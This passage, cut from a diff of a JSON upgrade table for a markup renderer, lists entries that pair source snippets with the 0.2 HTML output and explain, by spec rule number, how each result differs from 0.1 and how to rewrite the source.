+      "to": "[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[\\[x\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]\\]]{.a}\n",
+      "meaning02": "<p>[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[x]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]{.a}</p> Inline nesting stops at depth 200 (C2-I-118): the 201st opening bracket is text, so the outermost closing bracket pairs with nothing and the attribute block stays text; 0.1 formed the outer span around 200 literal bracket pairs. Escaping the inner brackets keeps the 0.1 HTML.",
+      "toolEntry": "U-286",
+      "silent": true
+    },
+    {
+      "id": "U-287",
+      "kind": "report",
+      "group": "differences that stay",
+      "from": "| a | b |\n",
+      "to": "",
+      "meaning02": "<table>\n  <tbody>\n    <tr><td>a</td><td>b</td></tr>\n  </tbody>\n</table> With `sourceLines` on, C2-H-016 annotates `<tbody>` and `<tr>` as well as `<table>`, and annotates no bare block image, no `<p>` of a line block stanza and no `<li>` of the footnote section; the 0.1 option `sourceLine` annotated the table only and annotated those three. Readers of `data-source-line` have to expect the other elements.",
+      "toolEntry": "U-287",
+      "silent": true
+    },
+    {
+      "id": "U-288",
+      "kind": "report",
+      "group": "differences that stay",
+      "from": "{data-source-line=\"99\"}\np\n",
+      "to": "",
+      "meaning02": "<p data-source-line=\"99\">p</p> With `sourceLines` on, the generated value replaces an authored `data-source-line` (C2-H-016), so the paragraph carries `data-source-line=\"1\"`; the 0.1 option `sourceLine` kept the authored 99. Without the option both write the authored value. No 0.2 source keeps an authored value under the option.",
+      "toolEntry": "U-288",
+      "silent": true
+    },
+    {
+      "id": "U-289",
+      "kind": "report",
+      "group": "differences that stay",
+      "from": "{{ a.crv @shift:1 }}\n",
+      "to": "",
+      "meaning02": "<p>{{ a.crv @shift:1 }}</p> An unexpanded include renders the directive as text (C2-H-133, C2-N-070), so no inline form is read in it; with no resolver, or with an invalid option such as `@unknown:foo` under a resolver, 0.1 read `@shift` as a mention, `<span class=\"mention\"><strong>@shift</strong></span>`. Escaping the opening brace gives the 0.1 HTML but makes the line text that no resolver expands, so the row is a report.",
+      "toolEntry": "U-289",
+      "silent": true
+    },
+    {
+      "id": "U-290",
+      "kind": "rewrite",
+      "group": "differences that stay",
+      "from": "x {{ a.crv @lines:0 }} y\n",
+      "to": "x {{ a.crv \\@lines:0 }} y\n",
+      "meaning02": "<p>x {{ a.crv <span class=\"mention\"><strong>@lines</strong></span>:0 }} y</p> A directive inside inline content is text whose braces are each read on their own (C2-N-002), so `@lines` is a mention; 0.1 kept a directive with an invalid option inside a sentence as opaque text. An escaped `@` keeps the 0.1 HTML.",
+      "toolEntry": "U-290",
+      "silent": true
+    },
+    {
+      "id": "U-291",
+      "kind": "report",
+      "group": "differences that stay",
+      "from": "{{ a.crv@code:js }}\n",
+      "to": "",
+      "meaning02": "<p>{{ a.crv @code:js }}</p> An unexpanded include writes the directive from the tree, each option after one space and in the order of C2-W-058 (C2-H-133, C2-H-171); 0.1 wrote the source as authored, `{{ a.crv@code:js }}`, and kept the authored order of `@code` and `@cols`. No 0.2 source writes the glued spelling.",
+      "toolEntry": "U-291",
+      "silent": true
+    },
+    {
+      "id": "U-292",
+      "kind": "report",
+      "group": "differences that stay",
+      "from": "{.diff}\n{{ a.crv @code:js }}\n",
+      "to": "",
+      "meaning02": "<p>{{ a.crv @code:js }}</p> An include's own attributes are not written to HTML (C2-N-072, C2-A-181), so the fallback paragraph of an unexpanded include has none; 0.1 wrote them on it, `<p class=\"diff\">`, also the `{table}` key on a table include rejected for an invalid `@rows`. The caption of a code include is not part of this row.",
+      "toolEntry": "U-292",
+      "silent": true
+    },
+    {
+      "id": "U-293",
+      "kind": "report",
+      "group": "differences that stay",
+      "from": ":::\n:::\n",
+      "to": "",
+      "meaning02": "<div>\n\n</div> Under `minimal` this empty div writes nothing: a node outside the profile writes its plain text and no placeholder word, and a node that holds no text writes nothing (C2-H-165). 0.1 wrote the node type in brackets for every degraded node without text: `[div]`, `[table]` for `||`, `[block_quote]` for `>`, `[code_block]` for an empty fence, `[link]` for `[](/u)`, `[text]` for each quote of `x.*/\"q\"/*`, and `[img]` for an image with no alt, where 0.2 writes `[img: ]`. The other degraded forms that differ are named in the UPGRADING.md row. No 0.2 source gives the placeholders.",
+      "toolEntry": "U-293",
+      "silent": true
+    },
+    {
+      "id": "U-300",
+      "kind": "rewrite",
+      "group": "rulings of 17 November",
+      "from": "`a\n%% b\nc`\n",
+      "to": "`a\nc`\n%% b\n",
+      "meaning02": "<p>`a\nc`</p> C2-B-138: no inline atom spans a comment-only line, so a code span, a math span or an editorial comment opened before the line and closed after it is text on both sides; 0.1 dropped the line and read <p><code>a\nc</code></p>. Moving the comment line below the closing line keeps the 0.1 output.",
+      "toolEntry": "U-300",
+      "silent": true
+    },
+    {
+      "id": "U-301",
+      "kind": "report",
+      "group": "rulings of 17 November",
+      "from": "{{ a.crv @lines:3-7 }}\n",
+      "to": "",
+      "meaning02": "<p>—\nt: 1\n—</p>\n<p>para</p> for an `a.crv` of `x`, a blank line, `---`, `t: 1`, `---`, a blank line and `para`. C2-N-020: a selection opens frontmatter only when it starts at line 1 of the file; 0.1 read the selected `---` lines as frontmatter and wrote <p>para</p>. Start the selection below the closing `---` line where the lines are meant as frontmatter.",
+      "toolEntry": "U-301",
+      "silent": true
+    },
+    {
+      "id": "U-302",
+      "kind": "report",
+      "group": "rulings of 17 November",
+      "from": "{{ a.crv @region:k }}\n",
+      "to": "",
+      "meaning02": "<p>See <a href=\"/u\">s</a> and <abbr title=\"Hyper\">HTML</abbr>.</p> for an `a.crv` of `%% #region k`, `See [s][] and HTML.`, `%% #endregion k`, a blank line, `[s]: /u` and `*[HTML]: Hyper`. C2-N-020, C2-N-054: a line or region selection sees every definition of its file, as a section does (C2-N-031); 0.1 resolved only against the selected lines and wrote <p>See [s][] and HTML.</p>.",
+      "toolEntry": "U-302",
+      "silent": true
+    },
+    {
+      "id": "U-303",
+      "kind": "report",
+      "group": "rulings of 17 November",
+      "from": "|=\ta|\n| x |\n",
+      "to": "",
+      "meaning02": "<table>\n  <thead>\n    <tr><th scope=\"col\">a</th></tr>\n  </thead>\n  <tbody>\n    <tr><td>x</td></tr>\n  </tbody>\n</table> C2-B-171: a tab after `=` keeps the header cell mark, as a space does; 0.1 read `|=` and a tab as a data cell whose text starts with `=` and the tab.",
+      "toolEntry": "U-303",
+      "silent": true
+    },
+    {
+      "id": "U-304",
+      "kind": "escape",
+      "group": "rulings of 17 November",
+      "from": "|{>.c} a |\n",
+      "to": "|\\{>.c} a |\n",
+      "meaning02": "<table>\n  <tbody>\n    <tr><td class=\"c\" style=\"text-align: right;\">a</td></tr>\n  </tbody>\n</table> C2-B-182: a part may follow the alignment marks with no space, so `{>.c}` is right with the class `c`, and `{>^.c}` and `{>vx}` read the vertical mark too; 0.1 read a brace block with a part glued to the marks as cell text.",
+      "toolEntry": "U-304",
+      "silent": true
+    },
+    {
+      "id": "U-305",
+      "kind": "escape",
+      "group": "rulings of 17 November",
+      "from": "|{>}{^} a |\n",
+      "to": "|\\{>}{^} a |\n",
+      "meaning02": "<table>\n  <tbody>\n    <tr><td style=\"text-align: right;\">{^} a</td></tr>\n  </tbody>\n</table> C2-B-171, C2-B-182: a cell prefix takes a run of glued brace blocks, with the marks only at the start of the first; 0.1 read every glued run in a cell prefix, such as `{>}{^}` or `{.a}{.b}`, as cell text.",
+      "toolEntry": "U-305",
+      "silent": true
+    },
+    {
+      "id": "U-340",
+      "kind": "rewrite",
+      "group": "differences that stay",
+      "from": "[^ ]: x\n\na[^ ]\n",
+      "to": "[^blank]: x\n\na[^blank]\n",
+      "meaning02": "<p>[^ ]: x</p>\n<p>a[^ ]</p> A label whose key is empty after folding, one of spaces, tabs or a line break, is no label (C2-I-079), so the definition and the reference are text and the note is lost; 0.1 read `[^ ]` as a footnote label, and `[t][ ]` with `[ ]: /u` as a link to `/u`. A label the document does not use, such as `blank`, in place of the blank one keeps the 0.1 HTML. The lint rule `blank-reference-label` reports the blank label.",
+      "toolEntry": "U-340",
+      "silent": true
+    },
+    {
+      "id": "U-341",
+      "kind": "report",
+      "group": "host options",
+      "from": "@alice and #news\n",
+      "to": "",
+      "meaning02": "With `social: {mentionUrl: '/u/{user}'}` or `{tagUrl: '/t/{tag}'}` the render is refused with an option error: `{name}` is the only placeholder of a template (C2-H-126), and any other placeholder is refused rather than written into the `href`. 0.1 replaced `{user}` in `mentionUrl` and `{tag}` in `tagUrl` by the name, `<a class=\"mention\" href=\"/u/alice\">`. Write `{name}`.",
+      "toolEntry": "U-341",
+      "silent": false
+    },
+    {
+      "id": "U-360",
+      "kind": "rewrite",
+      "group": "kept and recorded",
+      "from": "{{ a.txt @code }}\n^ cap\n",
+      "to": "{{ a.txt @code }}\n\n^ cap\n",
+      "meaning02": "<p>{{ a.txt @code }}</p>\n<p>cap</p> C2-B-147 and C2-N-073 attach a caption line directly below a code include to the include, also when it is not expanded, and C2-N-074 writes that caption after the directive's paragraph as one more paragraph; 0.1 kept the caret line as text, `<p>^ cap</p>`. A blank line before the caret keeps the 0.1 HTML at document level and in a quote. In a list item 0.1 also made the list loose: with a blank line before the caret and one between the items the 0.1 HTML comes back, but an item alone in its list is tight (C2-B-062, C2-H-034), so its first paragraph stays bare.",
+      "toolEntry": "U-360",
+      "silent": true
+    },
+    {
+      "id": "U-361",
+      "kind": "rewrite",
+      "group": "kept and recorded",
+      "from": ":: t\n: d\n%%%\n%%%\n: d2\n",
+      "to": ":: t\n: d\n  %%%\n  %%%\n: d2\n",
+      "meaning02": "<dl>\n  <dt>t</dt>\n  <dd>d</dd>\n</dl>\n<p>: d2</p> A comment block opener is a block line (C2-B-108); at column 0 below a description it is not indented past the mark, so the description and its list close (C2-B-025, C2-B-026, C2-B-076), and `: d2` has no term left. 0.1 kept the description list open across a comment block at column 0. Indenting the comment block into the description keeps the 0.1 HTML. Below an item, `- a`, `%%%`, `%%%`, `  b`, 0.2 closes the list the same way and `b` is a paragraph after it; indented to the content column the block keeps `b` in the item as `<p>b</p>`, where 0.1 wrote it bare (C2-H-034, U-019).",
+      "toolEntry": "U-361",
+      "silent": true
+    },
+    {
+      "id": "U-362",
+      "kind": "report",
+      "group": "kept and recorded",
+      "from": "- a\n\n {%%}\n  - b\n",
+      "to": "- a\n\n{%%}\n  - b\n",
+      "meaning02": "<ul>\n  <li>a\n    <ul>\n      <li>b</li>\n    </ul>\n  </li>\n</ul> A line indented short of the content column after a blank line still belongs to the item (C2-B-025, U-109), and a paragraph of comments counts as content and renders nothing (C2-B-140), so `- b` is a nested list. 0.1 closed the list at the comment line, and `- b` was a lazy line of a paragraph that started with a line feed, `<p>` then `- b</p>`. With the comment at column 0 the list closes as in 0.1, but a line that holds only comments takes its line break with it (C2-H-069), so 0.2 writes `<p>- b</p>`; no 0.2 source writes the leading line feed.",
+      "toolEntry": "U-362",
+      "silent": true
+    },
+    {
+      "id": "U-363",
+      "kind": "rewrite",
+      "group": "kept and recorded",
+      "from": "a {%%}'word\n",
+      "to": "a {%%}’word\n",
+      "meaning02": "<p>a ‘word</p> C2-I-026 tests the characters on the two sides of a braced comment as if they were glued, so the quote follows a space and opens (C2-I-104). 0.1 read the comment as a character before the quote and wrote an apostrophe, `<p>a ’word</p>`; `a{%%} 'word` did the same. Typing the apostrophe keeps the 0.1 HTML.",
+      "toolEntry": "U-363",
+      "silent": true
+    },
+    {
+      "id": "U-364",
+      "kind": "report",
+      "group": "kept and recorded",
+      "from": "a{%%}#tag\n",
+      "to": "",
+      "meaning02": "<p>a#tag</p> C2-I-026 tests the characters on the two sides of a braced comment as if they were glued, so `#` follows the letter `a` and starts no tag (C2-I-090). 0.1 read the comment as a boundary and wrote a tag, `<p>a<span class=\"tag\"><strong>#tag</strong></span></p>`. A tag glued to a letter has no 0.2 spelling; a space before the sigil gives the tag behind a space.",
+      "toolEntry": "U-364",
+      "silent": true
+    },
+    {
+      "id": "U-365",
+      "kind": "rewrite",
+      "group": "kept and recorded",
+      "from": "{-{#x-}\n",
+      "to": "{-\\{#x-}\n",
+      "meaning02": "<p>{-{#x-}</p> `{#x-}` is a valid attribute block, one atom taken whole (C2-I-005, C2-I-035), so it holds the `-}` that would close the deletion, and the deletion opens no span (C2-I-119). 0.1 closed the deletion at `-}` and read `#x` as a tag, `<p><del>{<span class=\"tag\"><strong>#x</strong></span></del></p>`. An escaped inner brace keeps the 0.1 HTML. The underline form `{_{#x_}` differs the same way, and there the escape leaves `#x_` a tag, so it has no rewrite.",
+      "toolEntry": "U-365",
+      "silent": true
+    },
+    {
+      "id": "U-366",
+      "kind": "rewrite",
+      "group": "kept and recorded",
+      "from": "# A </#A>\n",
+      "to": "{#A}\n# A [A A ](#A)\n",
+      "meaning02": "<section id=\"A\">\n  <h1>A <a href=\"#A\">A </a></h1>\n</section> A resolved cross-reference to a heading writes the plain text of the heading (C2-H-096), and a cross-reference gives no plain text (C2-H-143), so a heading that refers to itself writes its text without the reference, `A `. 0.1 expanded the reference once inside its own label, `A A `. U-206 records the same rule for emphasis. An explicit link with the 0.1 text keeps the 0.1 HTML; the authored id keeps the section id, which the link text would otherwise change.",
+      "toolEntry": "U-366",
+      "silent": true
+    },
+    {
+      "id": "U-367",
+      "kind": "rewrite",
+      "group": "kept and recorded",
+      "from": "{#t}\n![a](u)\n^ #y#\n\n</#t>\n",
+      "to": "{#t}\n![a](u)\n^ #y#\n\n[#y 1](#t)\n",
+      "meaning02": "<figure id=\"t\">\n  <img src=\"u\" alt=\"a\">\n  <figcaption><span class=\"tag\"><strong>#y</strong></span>1</figcaption>\n</figure>\n<p><a href=\"#t\">#y 1</a></p> A resolved cross-reference to a numbered caption writes the label word and the number as text (C2-H-096), so a tag that is the label word is plain `#y`. 0.1 wrote the label's inline markup into the reference, `<a href=\"#t\"><span class=\"tag\"><strong>#y</strong></span> 1</a>`. An explicit link with the label and the number keeps the 0.1 HTML, but its number no longer follows the figure.",
+      "toolEntry": "U-367",
+      "silent": true
+    },
+    {
+      "id": "U-368",
+      "kind": "rewrite",
+      "group": "kept and recorded",
+      "from": "```js `\n```\n",
+      "to": "```js\n```\n",
+      "meaning02": "<p>```js `</p>\n<pre><code></code></pre> A backtick run whose info string holds a backtick is not an opener (C2-B-118), so the line is paragraph text and the next run opens a code block that runs to the end. 0.1 opened a code block with the language `js`, `<pre><code class=\"language-js\"></code></pre>`, also with body lines. Removing the backtick from the info string keeps the 0.1 HTML.",
+      "toolEntry": "U-368",
+      "silent": true
+    },
+    {
+      "id": "U-369",
+      "kind": "rewrite",
+      "group": "kept and recorded",
+      "from": "| a |\n|{.x} ^ |\n",
+      "to": "| a |\n|{.x} \\^ |\n",
+      "meaning02": "<table>\n  <tbody>\n    <tr><td rowspan=\"2\">a</td></tr>\n    <tr></tr>\n  </tbody>\n</table> A span mark behind a cell prefix is still a span mark, and the prefix of a mark that joins is kept for nothing else (C2-B-174), so `^` joins the cell above. 0.1 read a `^` behind an attribute block as cell text, `<td class=\"x\">^</td>`. An escaped caret keeps the 0.1 HTML.",
+      "toolEntry": "U-369",
+      "silent": true
+    },
+    {
+      "id": "U-370",
+      "kind": "report",
+      "group": "kept and recorded",
+      "from": "```\ncode",
+      "to": "",
+      "meaning02": "<pre><code>code\n</code></pre> C2-B-222 ends every body line of a code block with a line feed, also the last line of an unclosed fence that the end of input closes without one. 0.1 wrote the value as the input ended, `<pre><code>code</code></pre>`, also in a quote and in a list item. A code value always ends with a line feed in 0.2, so no source gives the 0.1 HTML.",
+      "toolEntry": "U-370",
+      "silent": true
+    },
+    {
+      "id": "U-371",
+      "kind": "report",
+      "group": "rulings of 17 November, 13:55",
+      "from": "[x][no]{.c}{#i}\n",
+      "to": "",
+      "meaning02": "<p>[x][no]{#i .c}</p> An unresolved reference writes its glued attribute blocks merged, as one block in the fixed order (C2-I-085, C2-H-139), so the HTML is a function of the tree; 0.1 wrote them as typed, `<p>[x][no]{.c}{#i}</p>`. No rewrite is recorded; review.",
+      "toolEntry": "U-371",
+      "silent": true
+    },
+    {
+      "id": "U-372",
+      "kind": "report",
+      "group": "lint report counts",
+      "from": "a\n- b\n- c\n",
+      "to": "",
+      "meaning02": "0.2 reports each marker-shaped paragraph line; 0.1 reported only the first line of the run. The HTML is unchanged.",
+      "toolEntry": "U-372",
+      "silent": false
+    },
+    {
+      "id": "U-373",
+      "kind": "report",
+      "group": "lint report counts",
+      "from": "| a\n| b\n",
+      "to": "",
+      "meaning02": "0.2 reports each table-shaped paragraph line; 0.1 reported only the first line of the run. The HTML is unchanged.",
+      "toolEntry": "U-373",
+      "silent": false
+    },
+    {
+      "id": "U-374",
+      "kind": "report",
+      "group": "nested braced boundaries",
+      "from": "{-{_a-}_} b-}",
+      "to": "",
+      "meaning02": "At nested braced boundaries, C2-I-058 and C2-I-059 pair the first matching closer and remove later openers from the delimiter stack. The 0.1 HTML nests an underline inside deletion for this input; 0.2 does not, because the inner underline opener is removed when the outer deletion closes. The same boundary rule governs `{-a-}{+{+b~}+}+}`. No source rewrite is promised; review the nesting.",
+      "toolEntry": "U-374",
+      "silent": true
+    },
+    {
+      "id": "U-375",
+      "kind": "rewrite",
+      "group": "smart typography",
+      "from": "a=\"b\"\n:\"q\"\n-\"q\"\n/\"q\"\n(\"q\")\n",
+      "to": "a=\"b\"\n:\"q\"\n-“q\"\n/“q\"\n(\"q\")\n",
+      "meaning02": "<p>a=“b”\n:“q”\n-”q”\n/”q”\n(“q”)</p> The opening quotes after a hyphen and a slash become closing quotes under C2-I-104 and C2-I-111. Replace just those opening quote characters with U+201C. Rewrite the source range from the two opening quote characters.",
+      "toolEntry": "U-375",
+      "silent": true
+    },
+    {
+      "id": "U-376",
+      "kind": "rewrite",
+      "group": "abbreviation definitions",
+      "from": "*[HTML]:  Hyper Text\n\nHTML\n",
+      "to": "*[HTML]: Hyper Text\n\nHTML\n",
+      "meaning02": "<p><abbr title=\" Hyper Text\">HTML</abbr></p> The second separator space becomes part of the abbreviation title under C2-B-084. Keep one separator space. Rewrite the source range from the separator space run after the definition colon.",
+      "toolEntry": "U-376",
+      "silent": true
+    },
+    {
+      "id": "U-377",
+      "kind": "rewrite",
+      "group": "table column lists",
+      "from": "{aligns=\"right,,center\" valigns=\"top,middle,bottom\" widths=\"25,50,25\"}\n| A | B | C |\n| D | E | F |\n",
+      "to": "{valigns=\"top,middle,bottom\" widths=\"25,50,25\"}\n|{>} A | B |{~} C |\n|{>} D | E |{~} F |\n",
+      "meaning02": "<table>\n  <colgroup>\n    <col style=\"width: 25%;\">\n    <col style=\"width: 50%;\">\n    <col style=\"width: 25%;\">\n  </colgroup>\n  <tbody>\n    <tr><td style=\"vertical-align: top;\">A</td><td style=\"vertical-align: middle;\">B</td><td style=\"vertical-align: bottom;\">C</td></tr>\n    <tr><td style=\"vertical-align: top;\">D</td><td style=\"vertical-align: middle;\">E</td><td style=\"vertical-align: bottom;\">F</td></tr>\n  </tbody>\n</table> An invalid alignment list contributes no alignment under C2-B-211, C2-B-212 and C2-B-227. Remove that list and put alignment marks on each affected cell. Rewrite the source range from the invalid list attribute and each affected cell prefix.",
+      "toolEntry": "U-377",
+      "silent": true
+    },
+    {
+      "id": "U-378",
+      "kind": "report",
+      "group": "description ownership",
+      "from": ":: t\n:  [^f]: note\n     cont\ntail\n",
+      "to": "",
+      "meaning02": "<dl>\n  <dt>t</dt>\n  <dd>[^f]: note\ncont\ntail</dd>\n</dl> A footnote-shaped definition in a description and its following unprefixed line stay in the description under C2-B-081 and C2-B-083. Report the source range from the nested definition opener through the following unprefixed line.",
+      "toolEntry": "U-378",
+      "silent": true
+    },
+    {
+      "id": "U-379",
+      "kind": "report",
+      "group": "description ownership",
+      "from": ":: c\n%% note\nmore\n",
+      "to": "",
+      "meaning02": "<dl>\n  <dt>c</dt>\n</dl>\n<p>more</p> The comment-only line is not seen (C2-B-137), and `more`, which is not indented past the term mark, ends the term (C2-B-234), so the visible HTML is the 0.1 HTML.",
+      "toolEntry": "U-379",
+      "silent": false
+    },
+    {
+      "id": "U-380",
+      "kind": "report",
+      "group": "div labels",
+      "from": "::: note [%% hidden]\nbody\n:::\n",
+      "to": "",
+      "meaning02": "<aside class=\"admonition note\" aria-label=\"Note\">\n  <p class=\"div-label\">%% hidden</p>\n  <p>body</p>\n</aside> The bracketed div label keeps its comment marker as text under C2-I-023 and C2-B-225. Report the source range from the bracketed label on the div opener.",
+      "toolEntry": "U-380",
+      "silent": true
+    },
+    {
+      "id": "U-381",
+      "kind": "report",
+      "group": "div labels",
+      "from": "::: note [/i/]\nbody\n:::\n",
+      "to": "",
+      "meaning02": "<aside class=\"admonition note\" aria-label=\"Note\">\n  <p class=\"div-label\">/i/</p>\n  <p>body</p>\n</aside> The bracketed div label keeps its slash marks as text under C2-B-225. Report the source range from the bracketed label on the div opener.",
+      "toolEntry": "U-381",
+      "silent": true
+    },
+    {
+      "id": "U-382",
+      "kind": "report",
+      "group": "container ownership",
+      "from": "- ::: inner\n %% c\n text\n",
+      "to": "",
+      "meaning02": "<ul>\n  <li>\n    <div class=\"inner\">\n      <p>text</p>\n    </div>\n  </li>\n</ul> A line after a comment stays inside a closed nested div and item under C2-B-025 and C2-B-059. Report the source range from the comment line through the next retained line.",
+      "toolEntry": "U-382",
+      "silent": true
+    },
+    {
+      "id": "U-383",
+      "kind": "report",
+      "group": "container ownership",
+      "from": "> - ::: box\n>   - inner\n>     %%%\n>     hidden\n>     %%%\n>    ```\n>    code\n- tail\n",
+      "to": "",
+      "meaning02": "<blockquote>\n  <ul>\n    <li>\n      <div class=\"box\">\n        <ul>\n          <li>inner\n            <pre><code>code\n</code></pre>\n          </li>\n        </ul>\n      </div>\n    </li>\n  </ul>\n</blockquote>\n<ul>\n  <li>tail</li>\n</ul> After a comment fence, a shifted code fence belongs to the nested item under C2-B-025 and C2-B-059. Report the source range from the comment fence through the shifted code opener.",
+      "toolEntry": "U-383",
+      "silent": true
+    },
+    {
+      "id": "U-384",
+      "kind": "report",
+      "group": "container ownership",
+      "from": "> - ::: box\n>   - ::: inner\n>     %% c\n>    text\ntail\n",
+      "to": "",
+      "meaning02": "<blockquote>\n  <ul>\n    <li>\n      <div class=\"box\">\n        <ul>\n          <li>\n            <div class=\"inner\">\n              <p>text\ntail</p>\n            </div>\n          </li>\n        </ul>\n      </div>\n    </li>\n  </ul>\n</blockquote> A comment-only line leaves the inner div open for the next line under C2-B-025 and C2-B-059. Report the source range from the comment-only line through the next retained line.",
+      "toolEntry": "U-384",
+      "silent": true
+    },
+    {
+      "id": "U-385",
+      "kind": "report",
+      "group": "container ownership",
+      "from": "> > - ::: box\n> >   - inner\n> >     %% c\n> >    ```\n> >    code\n- tail\n",
+      "to": "",
+      "meaning02": "<blockquote>\n  <blockquote>\n    <ul>\n      <li>\n        <div class=\"box\">\n          <ul>\n            <li>inner\n              <pre><code>code\n</code></pre>\n            </li>\n          </ul>\n        </div>\n      </li>\n    </ul>\n  </blockquote>\n</blockquote>\n<ul>\n  <li>tail</li>\n</ul> A shifted code fence after a comment stays in the nested item under C2-B-025 and C2-B-059. Report the source range from the comment line through the shifted code opener.",
+      "toolEntry": "U-385",
+      "silent": true
+    },
+    {
+      "id": "U-386",
+      "kind": "report",
+      "group": "container ownership",
+      "from": "> - ::: box\n>   - ::: |\n>     x\n>     :::\n>    ```\n>    :::bad\n>    :::\n- tail\n",
+      "to": "",
+      "meaning02": "<blockquote>\n  <ul>\n    <li>\n      <div class=\"box\">\n        <ul>\n          <li>\n            <div class=\"line-block\">\n              <p>x</p>\n            </div>\n            <pre><code>:::bad\n:::\n</code></pre>\n          </li>\n        </ul>\n      </div>\n    </li>\n  </ul>\n</blockquote>\n<ul>\n  <li>tail</li>\n</ul> A shifted code fence after a closed line block stays in the nested item under C2-B-025 and C2-B-059. Report the source range from the line-block closer through the shifted code opener.",
+      "toolEntry": "U-386",
+      "silent": true
+    },
+    {
+      "id": "U-387",
+      "kind": "report",
+      "group": "description ownership",
+      "from": "- :: t\n  : para\n   - li\n",
+      "to": "",
+      "meaning02": "<ul>\n  <li>\n    <dl>\n      <dt>t</dt>\n      <dd>\n        <p>para</p>\n        <ul>\n          <li>li</li>\n        </ul>\n      </dd>\n    </dl>\n  </li>\n</ul> The shifted list line is owned by the description, which gains a paragraph and a child list under C2-B-025 and C2-B-059. Report the source range from the description marker through the shifted list line.",
+      "toolEntry": "U-387",
+      "silent": true
+    },
+    {
+      "id": "U-388",
+      "kind": "report",
+      "group": "inline footnotes",
+      "from": "^[{+[^[g]+}] b+}]\n",
+      "to": "",
+      "meaning02": "<p><a id=\"fnref1\" href=\"#fn1\" role=\"doc-noteref\"><sup>1</sup></a></p>\n<section role=\"doc-endnotes\" aria-label=\"Footnotes\">\n  <hr>\n  <ol>\n    <li id=\"fn1\">\n      <p><ins>[^[g]</ins>] b+}<a href=\"#fnref1\" role=\"doc-backlink\" aria-label=\"Back to reference\">↩</a></p>\n    </li>\n  </ol>\n</section> Nested brackets inside an inline footnote pair differently under C2-I-089, splitting the insertion at a different closer. Report the source range from the inline footnote opener through its closing bracket.",
+      "toolEntry": "U-388",
+      "silent": true
+    },
+    {
+      "id": "U-389",
+      "kind": "report",
+      "group": "inline braced boundaries",
+      "from": "={_a=b_}\n",
+      "to": "",
+      "meaning02": "<p>={_a=b_}</p> The braced opener and its nested closer pair differently under C2-I-035 and C2-I-043. Report the source range from the outer equals sign through the final closing brace.",
+      "toolEntry": "U-389",
+      "silent": true
+    },
+    {
+      "id": "U-390",
+      "kind": "none",
+      "group": "editorial comments",
+      "from": "{-%% b-}\n",
+      "to": "{-%% b-}\n",
+      "meaning02": "<p><del>%% b</del></p> Under C2-I-023 `%%` directly after a braced opener is text, as in 0.1. No source edit is needed.",
+      "toolEntry": "U-390",
+      "silent": false
+    },
+    {
+      "id": "U-391",
+      "kind": "report",
+      "group": "comment fence ownership",
+      "from": "[^n]: head\n\n  %%%\n%% below\n\n  tail\n\nr[^n]\n",
+      "to": "",
+      "meaning02": "<p>tail</p>\n<p>r<a id=\"fnref1\" href=\"#fn1\" role=\"doc-noteref\"><sup>1</sup></a></p>\n<section role=\"doc-endnotes\" aria-label=\"Footnotes\">\n  <hr>\n  <ol>\n    <li id=\"fn1\">\n      <p>head<a href=\"#fnref1\" role=\"doc-backlink\" aria-label=\"Back to reference\">↩</a></p>\n    </li>\n  </ol>\n</section> A closerless comment fence inside a footnote body changes which later lines are hidden under C2-B-108. Report the source range from the comment fence opener through the following unhidden line.",
+      "toolEntry": "U-391",
+      "silent": true
+    },
+    {
+      "id": "U-392",
+      "kind": "none",
+      "group": "HTML attribute spelling",
+      "from": "{CLASS=z}\n::: |\nverse\n:::\n",
+      "to": "{CLASS=z}\n::: |\nverse\n:::\n",
